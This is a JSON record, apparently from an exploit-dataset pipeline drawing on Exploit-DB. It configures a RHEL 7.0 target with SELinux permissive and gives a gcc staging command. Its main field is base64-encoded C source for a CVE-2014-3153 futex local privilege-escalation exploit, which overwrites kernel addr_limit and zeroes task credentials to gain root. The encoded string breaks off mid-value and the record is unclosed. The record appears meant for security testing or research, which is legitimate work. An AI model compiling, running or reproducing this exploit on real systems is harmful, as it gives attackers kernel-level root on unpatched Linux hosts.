{
    "cpes": {
        "cpe:/o:redhat:enterprise_linux:7.0:ga:server": {
            "selinux": "permissive", 
            "packages": [
                "gcc"
            ], 
            "staging": "gcc -lpthread -o exploit exploit.c", 
            "filename": "exploit.c", 
            "scores": {
                "stride": "000008"
            }
        }
    }, 
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIENWRS0yMDE0LTMxNTMgZXhwbG9pdCBmb3IgUkhFTC9DZW50T1MgNy4wLjE0MDYNCiAqIEJ5IEthaXF1IENoZW4gKCBrYWlxdWNoZW5AMTYzLmNvbSApDQogKiBCYXNlZCBvbiBsaWJmdXRleCBhbmQgdGhlIGV4cG9pbHQgZm9yIEFuZHJvaWQgYnkgR2VvSG90Lg0KICoNCiAqIFVzYWdlOg0KICogJGdjYyBleHBsb2l0LmMgLW8gZXhwbG9pdCAtbHB0aHJlYWQNCiAqICQuL2V4cGxvaXQNCiAqDQogKi8NCg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8c3RkYm9vbC5oPg0KI2luY2x1ZGUgPHB0aHJlYWQuaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPHNpZ25hbC5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jbHVkZSA8bGludXgvZnV0ZXguaD4NCiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DQojaW5jbHVkZSA8c3lzL21tYW4uaD4NCiNpbmNsdWRlIDxzeXMvc3lzY2FsbC5oPg0KI2luY2x1ZGUgPHN5cy9yZXNvdXJjZS5oPg0KI2luY2x1ZGUgPGFycGEvaW5ldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4gIA0KI2luY2x1ZGUgPG5ldGluZXQvdGNwLmg+ICANCg0KI2RlZmluZSBBUlJBWV9TSVpFKGEpCShzaXplb2YgKGEpIC8gc2l6ZW9mICgqKGEpKSkNCg0KI2RlZmluZSBGVVRFWF9XQUlUX1JFUVVFVUVfUEkgICAxMQ0KI2RlZmluZSBGVVRFWF9DTVBfUkVRVUVVRV9QSSAgICAxMg0KI2RlZmluZSBVU0VSX1BSSU9fQkFTRSAgICAgICAgICAxMjANCiNkZWZpbmUgTE9DQUxfUE9SVCAgICAgICAgICAgICAgNTU1MQ0KDQojZGVmaW5lIFNJR05BTF9IQUNLX0tFUk5FTCAgICAgIDEyDQojZGVmaW5lIFNJR05BTF9USFJFQURfRVhJVCAgICAgIDEwDQoNCiNkZWZpbmUgT0ZGU0VUX1BJRAkJCTB4NEE0IA0KI2RlZmluZSBPRkZTRVRfUkVBTF9QQVJFTlQJMHg0QjgNCiNkZWZpbmUgT0ZGU0VUX0NSRUQJCQkweDY2OA0KDQojZGVmaW5lIFNJWkVPRl9DUkVECQkJMTYwDQojZGVmaW5lIFNJWkVPRl9UQVNLX1NUUlVDVAkyOTEyDQojZGVmaW5lIE9GRlNFVF9BRERSX0xJTUlUCTB4MjANCg0KI2RlZmluZSBQUklPX0xJU1RfT0ZGU0VUCTgJDQojZGVmaW5lIE5PREVfTElTVF9PRkZTRVQJKFBSSU9fTElTVF9PRkZTRVQgKyBzaXplb2Yoc3RydWN0IGxpc3RfaGVhZCkpDQojZGVmaW5lIFBSSU9fTElTVF9UT19XQUlURVIobGlzdCkgKCgodm9pZCAqKShsaXN0KSkgLSBQUklPX0xJU1RfT0ZGU0VUKQ0KI2RlZmluZSBXQUlURVJfVE9fUFJJT19MSVNUKHdhaXRlcikgKCgodm9pZCAqKSh3YWl0ZXIpKSArIFBSSU9fTElTVF9PRkZTRVQpDQojZGVmaW5lIE5PREVfTElTVF9UT19XQUlURVIobGlzdCkgKCgodm9pZCAqKShsaXN0KSkgLSBOT0RFX0xJU1RfT0ZGU0VUKQ0KI2RlZmluZSBXQUlURVJfVE9fTk9ERV9MSVNUKHdhaXRlcikgKCgodm9pZCAqKSh3YWl0ZXIpKSArIE5PREVfTElTVF9PRkZTRVQpDQojZGVmaW5lIE1VVEVYX1RPX1BSSU9fTElTVChtdXRleCkgKCgodm9pZCAqKShtdXRleCkpICsgc2l6ZW9mKGxvbmcpKQ0KI2RlZmluZSBNVVRFWF9UT19OT0RFX0xJU1QobXV0ZXgpICgoKHZvaWQgKikobXV0ZXgpKSArIHNpemVvZihsb25nKSArIHNpemVvZihzdHJ1Y3QgbGlzdF9oZWFkKSkNCg0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCnN0cnVjdCB0YXNrX3N0cnVjdDsNCg0Kc3RydWN0IHRocmVhZF9pbmZvIHsNCiAgc3RydWN0IHRhc2tfc3RydWN0ICp0YXNrOw0KICB2b2lkICpleGVjX2RvbWFpbjsNCiAgaW50IGZsYWdzOw0KICBpbnQgc3RhdHVzOw0KICBpbnQgY3B1Ow0KICBpbnQgcHJlZW1wdF9jb3VudDsNCiAgdm9pZCAqYWRkcl9saW1pdDsNCn07DQoNCnN0cnVjdCBsaXN0X2hlYWQgew0KICBzdHJ1Y3QgbGlzdF9oZWFkICpuZXh0Ow0KICBzdHJ1Y3QgbGlzdF9oZWFkICpwcmV2Ow0KfTsNCg0Kc3RydWN0IHBsaXN0X2hlYWQgew0KCXN0cnVjdCBsaXN0X2hlYWQgbm9kZV9saXN0Ow0KfTsNCg0Kc3RydWN0IHBsaXN0X25vZGUgew0KICBpbnQgICAgICAgICAgICAgICAgICAgICBwcmlvOw0KICBzdHJ1Y3QgbGlzdF9oZWFkICAgICAgICBwcmlvX2xpc3Q7DQogIHN0cnVjdCBsaXN0X2hlYWQgICAgICAgIG5vZGVfbGlzdDsNCn07DQoNCnN0cnVjdCBydF9tdXRleCB7DQoJdW5zaWduZWQgbG9uZwkJd2FpdF9sb2NrOw0KCXN0cnVjdCBwbGlzdF9oZWFkCXdhaXRfbGlzdDsNCglzdHJ1Y3QgdGFza19zdHJ1Y3QJKm93bmVyOw0KfTsNCg0Kc3RydWN0IHJ0X211dGV4X3dhaXRlciB7DQogIHN0cnVjdCBwbGlzdF9ub2RlICAgICAgIGxpc3RfZW50cnk7DQogIHN0cnVjdCBwbGlzdF9ub2RlICAgICAgIHBpX2xpc3RfZW50cnk7DQogIHN0cnVjdCB0YXNrX3N0cnVjdCAgICAgICp0YXNrOw0KICBzdHJ1Y3QgcnRfbXV0ZXggICAgICAgICAqbG9jazsNCn07DQoNCnN0cnVjdCBtbXNnaGRyIHsNCiAgc3RydWN0IG1zZ2hkciBtc2dfaGRyOw0KICB1bnNpZ25lZCBpbnQgIG1zZ19sZW47DQp9Ow0KDQpzdHJ1Y3QgY3JlZCB7DQoJaW50CXVzYWdlOw0KCWludAl1aWQ7CQkvKiByZWFsIFVJRCBvZiB0aGUgdGFzayAqLw0KCWludAlnaWQ7CQkvKiByZWFsIEdJRCBvZiB0aGUgdGFzayAqLw0KCWludAlzdWlkOwkJLyogc2F2ZWQgVUlEIG9mIHRoZSB0YXNrICovDQoJaW50CXNnaWQ7CQkvKiBzYXZlZCBHSUQgb2YgdGhlIHRhc2sgKi8NCglpbnQJZXVpZDsJCS8qIGVmZmVjdGl2ZSBVSUQgb2YgdGhlIHRhc2sgKi8NCglpbnQJZWdpZDsJCS8qIGVmZmVjdGl2ZSBHSUQgb2YgdGhlIHRhc2sgKi8NCglpbnQJZnN1aWQ7CQkvKiBVSUQgZm9yIFZGUyBvcHMgKi8NCglpbnQJZnNnaWQ7CQkvKiBHSUQgZm9yIFZGUyBvcHMgKi8NCn07DQoNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQoNCnN0YXRpYyBpbnQgc3dhZyA9IDA7DQpzdGF0aWMgaW50IHN3YWcyID0gMDsNCnN0YXRpYyBpbnQgbWFpbl9waWQ7DQoNCnN0YXRpYyBwaWRfdCB3YWl0ZXJfdGhyZWFkX3RpZDsNCg0Kc3RhdGljIHB0aHJlYWRfbXV0ZXhfdCBoYWNrZWRfbG9jazsNCnN0YXRpYyBwdGhyZWFkX2NvbmRfdCBoYWNrZWQ7DQoNCnN0YXRpYyBwdGhyZWFkX211dGV4X3QgZG9uZV9sb2NrOw0Kc3RhdGljIHB0aHJlYWRfY29uZF90IGRvbmU7DQoNCnN0YXRpYyBwdGhyZWFkX211dGV4X3QgaXNfdGhyZWFkX2Rlc2NoZWRfbG9jazsNCnN0YXRpYyBwdGhyZWFkX2NvbmRfdCBpc190aHJlYWRfZGVzY2hlZDsNCg0Kc3RhdGljIHZvbGF0aWxlIGludCBkb19zb2NrZXRfdGlkX3JlYWQgPSAwOw0Kc3RhdGljIHZvbGF0aWxlIGludCBkaWRfc29ja2V0X3RpZF9yZWFkID0gMDsNCg0Kc3RhdGljIHZvbGF0aWxlIGludCBkb19kbV90aWRfcmVhZCA9IDA7DQpzdGF0aWMgdm9sYXRpbGUgaW50IGRpZF9kbV90aWRfcmVhZCA9IDA7DQoNCnN0YXRpYyBwaWRfdCBsYXN0X3RpZCA9IDA7DQoNCnN0YXRpYyB2b2xhdGlsZSBpbnRfc3luY190aW1lX291dCA9IDA7DQoNCnN0cnVjdCB0aHJlYWRfaW5mbyB0aGluZm87DQpjaGFyIHRhc2tfc3RydWN0X2J1ZltTSVpFT0ZfVEFTS19TVFJVQ1RdOw0Kc3RydWN0IGNyZWQgY3JlZF9idWY7DQoNCnN0cnVjdCB0aHJlYWRfaW5mbyAqaGFja190aHJlYWRfc3RhY2sgPSBOVUxMOw0KDQpwdGhyZWFkX3QgdGhyZWFkX2NsaWVudF90b19zZXR1cF9ydF93YWl0ZXI7DQoNCmludCBsaXN0ZW5mZDsNCmludCBzb2NrZmQ7DQppbnQgY2xpZW50ZmQ7DQoNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCmludCBnZXR0aWQoKQ0Kew0KCXJldHVybiBzeXNjYWxsKF9fTlJfZ2V0dGlkKTsNCn0NCg0Kc3NpemVfdCByZWFkX3BpcGUodm9pZCAqa2J1Ziwgdm9pZCAqdWJ1Ziwgc2l6ZV90IGNvdW50KSB7DQoJaW50IHBpcGVmZFsyXTsNCglzc2l6ZV90IGxlbjsNCg0KCXBpcGUocGlwZWZkKTsNCg0KCWxlbiA9IHdyaXRlKHBpcGVmZFsxXSwga2J1ZiwgY291bnQpOw0KDQoJaWYgKGxlbiAhPSBjb3VudCkgew0KCQlwcmludGYoIlRocmVhZCAlZCBmYWlsZWQgaW4gcmVhZGluZyBAICVwIDogJWQgJWRcbiIsIGdldHRpZCgpLCBrYnVmLCAoaW50KWxlbiwgZXJybm8pOw0KCQl3aGlsZSgxKSB7IHNsZWVwKDEwKTsgfQ0KCX0NCg0KCXJlYWQocGlwZWZkWzBdLCB1YnVmLCBjb3VudCk7DQoNCgljbG9zZShwaXBlZmRbMF0pOw0KCWNsb3NlKHBpcGVmZFsxXSk7DQoNCglyZXR1cm4gbGVuOw0KfQ0KDQpzc2l6ZV90IHdyaXRlX3BpcGUodm9pZCAqa2J1Ziwgdm9pZCAqdWJ1Ziwgc2l6ZV90IGNvdW50KSB7DQoJaW50IHBpcGVmZFsyXTsNCglzc2l6ZV90IGxlbjsNCg0KCXBpcGUocGlwZWZkKTsNCg0KCXdyaXRlKHBpcGVmZFsxXSwgdWJ1ZiwgY291bnQpOw0KCWxlbiA9IHJlYWQocGlwZWZkWzBdLCBrYnVmLCBjb3VudCk7DQoNCglpZiAobGVuICE9IGNvdW50KSB7DQoJCXByaW50ZigiVGhyZWFkICVkIGZhaWxlZCBpbiB3cml0aW5nIEAgJXAgOiAlZCAlZFxuIiwgZ2V0dGlkKCksIGtidWYsIChpbnQpbGVuLCBlcnJubyk7DQoJCXdoaWxlKDEpIHsgc2xlZXAoMTApOyB9DQoJfQ0KDQoJY2xvc2UocGlwZWZkWzBdKTsNCgljbG9zZShwaXBlZmRbMV0pOw0KDQoJcmV0dXJuIGxlbjsNCn0NCg0KaW50IHB0aHJlYWRfY2FuY2VsX2ltbWVkaWF0ZWx5KHB0aHJlYWRfdCB0aGlkKQ0Kew0KCXB0aHJlYWRfa2lsbCh0aGlkLCBTSUdOQUxfVEhSRUFEX0VYSVQpOw0KCXB0aHJlYWRfam9pbih0aGlkLCBOVUxMKTsNCglyZXR1cm4gMDsNCn0NCg0Kdm9pZCBzZXRfYWRkcl9saW1pdCh2b2lkICpzcCkNCnsNCglsb25nIG5ld2xpbWl0ID0gLTE7DQoJd3JpdGVfcGlwZShzcCArIE9GRlNFVF9BRERSX0xJTUlULCAodm9pZCAqKSZuZXdsaW1pdCwgc2l6ZW9mKGxvbmcpKTsNCn0NCg0Kdm9pZCBzZXRfY3JlZChzdHJ1Y3QgY3JlZCAqa2NyZWQpDQp7DQoJc3RydWN0IGNyZWQgY3JlZF9idWY7DQoJaW50IGxlbjsNCg0KCWxlbiA9IHJlYWRfcGlwZShrY3JlZCwgJmNyZWRfYnVmLCBzaXplb2YoY3JlZF9idWYpKTsNCgljcmVkX2J1Zi51aWQgPSBjcmVkX2J1Zi5ldWlkID0gY3JlZF9idWYuc3VpZCA9IGNyZWRfYnVmLmZzdWlkID0gMDsNCgljcmVkX2J1Zi5naWQgPSBjcmVkX2J1Zi5lZ2lkID0gY3JlZF9idWYuc2dpZCA9IGNyZWRfYnVmLmZzZ2lkID0gMDsNCglsZW4gPSB3cml0ZV9waXBlKGtjcmVkLCAmY3JlZF9idWYsIHNpemVvZihjcmVkX2J1ZikpOw0KfQ0KDQpzdHJ1Y3QgcnRfbXV0ZXhfd2FpdGVyICpwd2FpdGVyMTE7DQoNCnZvaWQgc2V0X3BhcmVudF9jcmVkKHZvaWQgKnNwLCBpbnQgcGFyZW50X3RpZCkNCnsNCglpbnQgbGVuOw0KCWludCB0aWQ7DQoJc3RydWN0IHRhc2tfc3RydWN0ICpwcGFyZW50Ow0KCXN0cnVjdCBjcmVkICpwY3JlZDsNCgkNCglzZXRfYWRkcl9saW1pdChzcCk7DQoJDQoJbGVuID0gcmVhZF9waXBlKHNwLCAmdGhpbmZvLCBzaXplb2YodGhpbmZvKSk7DQoJaWYobGVuICE9IHNpemVvZih0aGluZm8pKSB7DQoJCXByaW50ZigiUmVhZCAlcCBlcnJvciAlZFxuIiwgc3AsIGxlbik7DQoJfQ0KCQ0KCXZvaWQgKnB0YXNrID0gdGhpbmZvLnRhc2s7DQoJbGVuID0gcmVhZF9waXBlKHB0YXNrLCB0YXNrX3N0cnVjdF9idWYsIFNJWkVPRl9UQVNLX1NUUlVDVCk7DQoJdGlkID0gKihpbnQgKikodGFza19zdHJ1Y3RfYnVmICsgT0ZGU0VUX1BJRCk7DQoNCgl3aGlsZSh0aWQgIT0gMCAmJiB0aWQgIT0gcGFyZW50X3RpZCkgew0KCQlwcGFyZW50ID0gKihzdHJ1Y3QgdGFza19zdHJ1Y3QgKiopKHRhc2tfc3RydWN0X2J1ZiArIE9GRlNFVF9SRUFMX1BBUkVOVCk7DQoJCWxlbiA9IHJlYWRfcGlwZShwcGFyZW50LCB0YXNrX3N0cnVjdF9idWYsIFNJWkVPRl9UQVNLX1NUUlVDVCk7DQoJCXRpZCA9ICooaW50ICopKHRhc2tfc3RydWN0X2J1ZiArIE9GRlNFVF9QSUQpOw0KCX0NCg0KCWlmKHRpZCA9PSBwYXJlbnRfdGlkKSB7DQoJCXBjcmVkID0gKihzdHJ1Y3QgY3JlZCAqKikodGFza19zdHJ1Y3RfYnVmICsgT0ZGU0VUX0NSRUQpOw0KCQlzZXRfY3JlZChwY3JlZCk7DQoJfSBlbHNlDQoJCXByaW50ZigiUGlkICVkIG5vdCBmb3VuZFxuIiwgcGFyZW50X3RpZCk7DQoJcmV0dXJuOw0KfQ0KDQpzdGF0aWMgaW50IHJlYWRfdm9sdW50YXJ5X2N0eHRfc3dpdGNoZXMocGlkX3QgcGlkKQ0Kew0KCWNoYXIgZmlsZW5hbWVbMjU2XTsNCglGSUxFICpmcDsNCglpbnQgdmNzY250ID0gLTE7DQoNCglzcHJpbnRmKGZpbGVuYW1lLCAiL3Byb2Mvc2VsZi90YXNrLyVkL3N0YXR1cyIsIHBpZCk7DQoJZnAgPSBmb3BlbihmaWxlbmFtZSwgInJiIik7DQoJaWYgKGZwKSB7DQoJCWNoYXIgZmlsZWJ1Zls0MDk2XTsNCgkJY2hhciAqcGRlc3Q7DQoJCWZyZWFkKGZpbGVidWYsIDEsIHNpemVvZiBmaWxlYnVmLCBmcCk7DQoJCXBkZXN0ID0gc3Ryc3RyKGZpbGVidWYsICJ2b2x1bnRhcnlfY3R4dF9zd2l0Y2hlcyIpOw0KCQl2Y3NjbnQgPSBhdG9pKHBkZXN0ICsgMHgxOSk7DQoJCWZjbG9zZShmcCk7DQoJfQ0KCXJldHVybiB2Y3NjbnQ7DQp9DQoNCnN0YXRpYyB2b2lkIHN5bmNfdGltZW91dF90YXNrKGludCBzaWcpDQp7DQoJaW50X3N5bmNfdGltZV9vdXQgPSAxOw0KfQ0KDQpzdGF0aWMgaW50IHN5bmNfd2l0aF9jaGlsZF9nZXRjaGFyKHBpZF90IHBpZCwgaW50IHZvbGF0aWxlICpkb19yZXF1ZXN0LCBpbnQgdm9sYXRpbGUgKmRpZF9yZXF1ZXN0KQ0Kew0KCXdoaWxlICgqZG9fcmVxdWVzdCA9PSAwKSB7IH0NCglwcmludGYoIlByZXNzIFJFVFVSTiBhZnRlciBvbmUgc2Vjb25kLi4uIik7DQoJKmRpZF9yZXF1ZXN0ID0gMTsNCglnZXRjaGFyKCk7DQoJcmV0dXJuIDA7DQp9DQoNCnN0YXRpYyBpbnQgc3luY193aXRoX2NoaWxkKHBpZF90IHBpZCwgaW50IHZvbGF0aWxlICpkb19yZXF1ZXN0LCBpbnQgdm9sYXRpbGUgKmRpZF9yZXF1ZXN0KQ0Kew0KCXN0cnVjdCBzaWdhY3Rpb24gYWN0Ow0KCWludCB2Y3NjbnQ7DQoJaW50X3N5bmNfdGltZV9vdXQgPSAwOw0KDQoJYWN0LnNhX2hhbmRsZXIgPSBzeW5jX3RpbWVvdXRfdGFzazsNCglzaWdlbXB0eXNldCgmYWN0LnNhX21hc2spOw0KCWFjdC5zYV9mbGFncyA9IDA7DQoJYWN0LnNhX3Jlc3RvcmVyID0gTlVMTDsNCglzaWdhY3Rpb24oU0lHQUxSTSwgJmFjdCwgTlVMTCk7DQoNCglhbGFybSgzKTsNCgl3aGlsZSAoKmRvX3JlcXVlc3QgPT0gMCkgew0KCQlpZiAoaW50X3N5bmNfdGltZV9vdXQpDQoJCQlyZXR1cm4gLTE7DQoJfQ0KCQ0KCWFsYXJtKDApOw0KCXZjc2NudCA9IHJlYWRfdm9sdW50YXJ5X2N0eHRfc3dpdGNoZXMocGlkKTsNCgkqZGlkX3JlcXVlc3QgPSAxOw0KCXdoaWxlIChyZWFkX3ZvbHVudGFyeV9jdHh0X3N3aXRjaGVzKHBpZCkgIT0gdmNzY250ICsgMSkgew0KICAgIAl1c2xlZXAoMTApOw0KCX0NCg0KCXJldHVybiAwOw0KfQ0KDQpzdGF0aWMgdm9pZCBzeW5jX3dpdGhfcGFyZW50KGludCB2b2xhdGlsZSAqZG9fcmVxdWVzdCwgaW50IHZvbGF0aWxlICpkaWRfcmVxdWVzdCkNCnsNCgkqZG9fcmVxdWVzdCA9IDE7DQoJd2hpbGUgKCpkaWRfcmVxdWVzdCA9PSAwKSB7IH0NCn0NCg0Kdm9pZCBmaXhfcnRfbXV0ZXhfd2FpdGVyX2xpc3Qoc3RydWN0IHJ0X211dGV4ICpwbXV0ZXgpDQp7DQoJc3RydWN0IHJ0X211dGV4X3dhaXRlciAqcHdhaXRlcjYsICpwd2FpdGVyNzsNCglzdHJ1Y3QgcnRfbXV0ZXhfd2FpdGVyIHdhaXRlcjYsIHdhaXRlcjc7DQoJc3RydWN0IHJ0X211dGV4IG11dGV4Ow0KCWlmKCFwbXV0ZXgpIA0KCQlyZXR1cm47DQoJcmVhZF9waXBlKHBtdXRleCwgJm11dGV4LCBzaXplb2YobXV0ZXgpKTsNCglwd2FpdGVyNiA9IE5PREVfTElTVF9UT19XQUlURVIobXV0ZXgud2FpdF9saXN0Lm5vZGVfbGlzdC5uZXh0KTsNCglpZighcHdhaXRlcjYpIA0KCQlyZXR1cm47DQoJcmVhZF9waXBlKHB3YWl0ZXI2LCAmd2FpdGVyNiwgc2l6ZW9mKHdhaXRlcjYpKTsNCglwd2FpdGVyNyA9IE5PREVfTElTVF9UT19XQUlURVIod2FpdGVyNi5saXN0X2VudHJ5Lm5vZGVfbGlzdC5uZXh0KTsNCglpZighcHdhaXRlcjcpIA0KCQlyZXR1cm47DQoJcmVhZF9waXBlKHB3YWl0ZXI3LCAmd2FpdGVyNywgc2l6ZW9mKHdhaXRlcjcpKTsNCgkNCgl3YWl0ZXI2Lmxpc3RfZW50cnkucHJpb19saXN0LnByZXYgPSB3YWl0ZXI2Lmxpc3RfZW50cnkucHJpb19saXN0Lm5leHQ7DQoJd2FpdGVyNy5saXN0X2VudHJ5LnByaW9fbGlzdC5uZXh0ID0gd2FpdGVyNy5saXN0X2VudHJ5LnByaW9fbGlzdC5wcmV2Ow0KCW11dGV4LndhaXRfbGlzdC5ub2RlX2xpc3QucHJldiA9IHdhaXRlcjYubGlzdF9lbnRyeS5ub2RlX2xpc3QubmV4dDsNCgl3YWl0ZXI3Lmxpc3RfZW50cnkubm9kZV9saXN0Lm5leHQgPSAgd2FpdGVyNi5saXN0X2VudHJ5Lm5vZGVfbGlzdC5wcmV2Ow0KCQ0KCXdyaXRlX3BpcGUocG11dGV4LCAmbXV0ZXgsIHNpemVvZihtdXRleCkpOw0KCXdyaXRlX3BpcGUocHdhaXRlcjYsICZ3YWl0ZXI2LCBzaXplb2Yod2FpdGVyNikpOw0KCXdyaXRlX3BpcGUocHdhaXRlcjcsICZ3YWl0ZXI3LCBzaXplb2Yod2FpdGVyNykpOw0KfQ0KDQpzdGF0aWMgdm9pZCB2b2lkX2hhbmRsZXIoaW50IHNpZ251bSkNCnsNCglwdGhyZWFkX2V4aXQoMCk7DQp9DQoNCnN0YXRpYyB2b2lkIGtlcm5lbF9oYWNrX3Rhc2soaW50IHNpZ251bSkNCnsNCglzdHJ1Y3QgcnRfbXV0ZXggKnBydF9tdXRleCwgcnRfbXV0ZXg7DQoJc3RydWN0IHJ0X211dGV4X3dhaXRlciBydF93YWl0ZXIxMTsNCglpbnQgdGlkID0gc3lzY2FsbChfX05SX2dldHRpZCk7DQoJaW50IHBpZCA9IGdldHBpZCgpOw0KDQoJc2V0X3BhcmVudF9jcmVkKGhhY2tfdGhyZWFkX3N0YWNrLCBtYWluX3BpZCk7DQoJDQoJcmVhZF9waXBlKHB3YWl0ZXIxMSwgKHZvaWQgKikmcnRfd2FpdGVyMTEsIHNpemVvZihydF93YWl0ZXIxMSkpOw0KCQ0KCXBydF9tdXRleCA9IHJ0X3dhaXRlcjExLmxvY2s7DQoJcmVhZF9waXBlKHBydF9tdXRleCwgKHZvaWQgKikmcnRfbXV0ZXgsIHNpemVvZihydF9tdXRleCkpOw0KCQ0KCXZvaWQgKnB0YXNrX3N0cnVjdCA9IHJ0X211dGV4Lm93bmVyOw0KCXB0YXNrX3N0cnVjdCA9ICh2b2lkICopKChsb25nKXB0YXNrX3N0cnVjdCAmIH4gMHhGKTsNCglpbnQgbGVuID0gcmVhZF9waXBlKHB0YXNrX3N0cnVjdCwgdGFza19zdHJ1Y3RfYnVmLCBTSVpFT0ZfVEFTS19TVFJVQ1QpOw0KCWludCAqcHBpZCA9IChpbnQgKikodGFza19zdHJ1Y3RfYnVmICsgT0ZGU0VUX1BJRCk7DQoJdm9pZCAqKnBzdGFjayA9ICh2b2lkICoqKSZ0YXNrX3N0cnVjdF9idWZbOF07DQoJdm9pZCAqb3duZXJfc3AgPSAqcHN0YWNrOw0KCXNldF9hZGRyX2xpbWl0KG93bmVyX3NwKTsNCg0KCXB0aHJlYWRfbXV0ZXhfbG9jaygmaGFja2VkX2xvY2spOw0KCXB0aHJlYWRfY29uZF9zaWduYWwoJmhhY2tlZCk7DQoJcHRocmVhZF9tdXRleF91bmxvY2soJmhhY2tlZF9sb2NrKTsNCn0NCg0Kc3RhdGljIHZvaWQgKmNhbGxfZnV0ZXhfbG9ja19waV93aXRoX3ByaW9yaXR5KHZvaWQgKmFyZykNCnsNCglpbnQgcHJpbzsNCglzdHJ1Y3Qgc2lnYWN0aW9uIGFjdDsNCglpbnQgcmV0Ow0KCQ0KCXByaW8gPSAobG9uZylhcmc7DQoJbGFzdF90aWQgPSBzeXNjYWxsKF9fTlJfZ2V0dGlkKTsNCgkNCglwdGhyZWFkX211dGV4X2xvY2soJmlzX3RocmVhZF9kZXNjaGVkX2xvY2spOw0KCXB0aHJlYWRfY29uZF9zaWduYWwoJmlzX3RocmVhZF9kZXNjaGVkKTsNCgkNCglhY3Quc2FfaGFuZGxlciA9IHZvaWRfaGFuZGxlcjsNCglzaWdlbXB0eXNldCgmYWN0LnNhX21hc2spOw0KCWFjdC5zYV9mbGFncyA9IDA7DQoJYWN0LnNhX3Jlc3RvcmVyID0gTlVMTDsNCglzaWdhY3Rpb24oU0lHTkFMX1RIUkVBRF9FWElULCAmYWN0LCBOVUxMKTsNCgkNCglhY3Quc2FfaGFuZGxlciA9IGtlcm5lbF9oYWNrX3Rhc2s7DQoJc2lnZW1wdHlzZXQoJmFjdC5zYV9tYXNrKTsNCglhY3Quc2FfZmxhZ3MgPSAwOw0KCWFjdC5zYV9yZXN0b3JlciA9IE5VTEw7DQoJc2lnYWN0aW9uKFNJR05BTF9IQUNLX0tFUk5FTCwgJmFjdCwgTlVMTCk7DQoJDQoJc2V0cHJpb3JpdHkoUFJJT19QUk9DRVNTLCAwLCBwcmlvKTsNCgkNCglwdGhyZWFkX211dGV4X3VubG9jaygmaXNfdGhyZWFkX2Rlc2NoZWRfbG9jayk7DQoJDQoJc3luY193aXRoX3BhcmVudCgmZG9fZG1fdGlkX3JlYWQsICZkaWRfZG1fdGlkX3JlYWQpOw0KCQ0KCXJldCA9IHN5c2NhbGwoX19OUl9mdXRleCwgJnN3YWcyLCBGVVRFWF9MT0NLX1BJLCAxLCAwLCBOVUxMLCAwKTsNCgkNCglyZXR1cm4gTlVMTDsNCn0NCg0Kc3RhdGljIHB0aHJlYWRfdCBjcmVhdGVfdGhyZWFkX2RvX2Z1dGV4X2xvY2tfcGlfd2l0aF9wcmlvcml0eShpbnQgcHJpbykNCnsNCglwdGhyZWFkX3QgdGg0Ow0KCXBpZF90IHBpZDsNCgkNCglkb19kbV90aWRfcmVhZCA9IDA7DQoJZGlkX2RtX3RpZF9yZWFkID0gMDsNCgkNCglwdGhyZWFkX211dGV4X2xvY2soJmlzX3RocmVhZF9kZXNjaGVkX2xvY2spOw0KCXB0aHJlYWRfY3JlYXRlKCZ0aDQsIDAsIGNhbGxfZnV0ZXhfbG9ja19waV93aXRoX3ByaW9yaXR5LCAodm9pZCAqKShsb25nKXByaW8pOw0KCXB0aHJlYWRfY29uZF93YWl0KCZpc190aHJlYWRfZGVzY2hlZCwgJmlzX3RocmVhZF9kZXNjaGVkX2xvY2spOw0KCQ0KCXBpZCA9IGxhc3RfdGlkOw0KCQ0KCXN5bmNfd2l0aF9jaGlsZChwaWQsICZkb19kbV90aWRfcmVhZCwgJmRpZF9kbV90aWRfcmVhZCk7DQoJDQoJcHRocmVhZF9tdXRleF91bmxvY2soJmlzX3RocmVhZF9kZXNjaGVkX2xvY2spOw0KCQ0KCXJldHVybiB0aDQ7DQp9DQoNCnN0YXRpYyBpbnQgc2VydmVyX2Zvcl9zZXR1cF9ydF93YWl0ZXIodm9pZCkNCnsNCglpbnQgc29ja2ZkOw0KCWludCB5ZXMgPSAxOw0KCXN0cnVjdCBzb2NrYWRkcl9pbiBhZGRyID0gezB9Ow0KCQ0KCXNvY2tmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7DQoJDQoJc2V0c29ja29wdChzb2NrZmQsIFNPTF9TT0NLRVQsIFNPX1JFVVNFQUREUiwgKGNoYXIgKikmeWVzLCBzaXplb2YoeWVzKSk7DQoJDQoJYWRkci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCglhZGRyLnNpbl9wb3J0ID0gaHRvbnMoTE9DQUxfUE9SVCk7DQoJYWRkci5zaW5fYWRkci5zX2FkZHIgPSBodG9ubChJTkFERFJfTE9PUEJBQ0spOw0KCWJpbmQoc29ja2ZkLCAoc3RydWN0IHNvY2thZGRyICopJmFkZHIsIHNpemVvZihhZGRyKSk7DQoJDQoJbGlzdGVuKHNvY2tmZCwgMSk7DQoJbGlzdGVuZmQgPSBzb2NrZmQ7DQoJDQoJcmV0dXJuIGFjY2VwdChzb2NrZmQsIE5VTEwsIE5VTEwpOw0KfQ0KDQpzdGF0aWMgaW50IGNvbm5lY3Rfc2VydmVyX3NvY2tldCh2b2lkKQ0Kew0KCWludCBzb2NrZmQ7DQoJc3RydWN0IHNvY2thZGRyX2luIGFkZHIgPSB7MH07DQoJaW50IHJldDsNCglpbnQgc29ja19idWZfc2l6ZTsNCgkNCglzb2NrZmQgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOw0KCWlmIChzb2NrZmQgPCAwKSB7DQoJCXByaW50Zigic29ja2V